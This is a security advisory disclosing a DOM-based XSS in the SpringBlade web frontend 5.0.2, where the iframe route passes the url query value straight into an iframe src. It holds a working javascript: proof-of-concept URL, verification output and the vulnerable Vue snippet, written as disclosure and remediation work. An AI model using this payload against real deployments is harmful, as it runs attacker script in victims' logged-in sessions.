# SpringBlade iframe route DOM XSS

## Summary

The SPA iframe route assigns the url query value directly to iframe src without restricting dangerous schemes.

## Affected product

- Vendor/project: **chillzhuang**
- Product: **SpringBlade web frontend**
- Affected version: **5.0.2**
- Weakness: **CWE-79**
- CVSS 3.1: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (6.1)`
- Verification: **STABLE — 3/3 consecutive fresh runs**

## Researcher

- **Zhong Guangyuan, Fudan University**

## Attack prerequisites and impact

Victim is logged in and opens an attacker-crafted hash URL; no attacker account is required to construct the URL.

Verified flow: `hash route query url -> $route.query.url -> iframe :src -> javascript: execution in the application origin`

Successful exploitation permits attacker-controlled markup or script to execute in another user's browser in the affected application origin. The exact privilege and interaction requirements are reflected in the CVSS vector above.

## Reproduction

1. Construct /#/iframe?url= with a javascript: URL that writes a fresh marker into the parent window.
2. Open the crafted route in a logged-in browser.
3. Read the rendered iframe src and the parent marker value from the browser context.

Sanitized request shape used during verification:

```http
GET <BASE_URL>/#/iframe?url=javascript:parent.__xss='gt48261022if3'

# Browser verification
iframe.src === "javascript:parent.__xss='gt48261022if3'"
window.__xss === "gt48261022if3"
```

Authentication values, private host/IP values, internal identifiers, CSRF values, document keys and one-time tokens are redacted. Parameter names, affected endpoints and payload structure are retained.

## Fresh verification evidence

| Run | Marker | Observation | Result |
| --- | --- | --- | --- |
| 1 | `gt48261022if1` | src exact; parent marker read back | **PASS** |
| 2 | `gt48261022if2` | src exact; parent marker read back | **PASS** |
| 3 | `gt48261022if3` | src exact; parent marker read back | **PASS** |

```text
Saved browser result object:
1: src=javascript:parent.__xss='gt48261022if1'; xss=gt48261022if1
2: src=javascript:parent.__xss='gt48261022if2'; xss=gt48261022if2
3: src=javascript:parent.__xss='gt48261022if3'; xss=gt48261022if3
```

The evidence was generated from a researcher-controlled test deployment. Test records were cleaned after verification.

## Confirmed source and Sink

```text
components/iframe/main.vue:30
<iframe
    :src="$route.query.url"
    frameborder="0"
    width="100%"
    height="100%"
></iframe>
```

Root cause: The route query is bound directly to a navigable iframe attribute with no URL parser or scheme allowlist.

## Recommended remediation

Parse the URL and allow only required http/https origins. Explicitly reject javascript:, data:, blob: and other active schemes.

## References

- Official source: https://github.com/chillzhuang/SpringBlade

## Evidence images

The three public evidence images show, in order:

1. The sanitized reproduction request, endpoint, parameter and payload structure.
2. The three consecutive successful verification runs and exact response/DOM/database excerpts.
3. The highlighted attacker-controlled source and unsafe rendering Sink.

The images are compact reviewer captures rendered from saved raw HTTP/DOM/database evidence. They preserve the verified request, response/DOM evidence, and highlighted source-to-Sink path while redacting credentials and private deployment details.

### Sanitized reproduction

![CAN-03 sanitized reproduction](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-03/01-reproduction-v2.png)

### Three-run success proof

![CAN-03 three-run success proof](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-03/02-success-proof-v2.png)

### Source-to-Sink evidence

![CAN-03 source-to-Sink evidence](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-03/03-source-sink-v2.png)
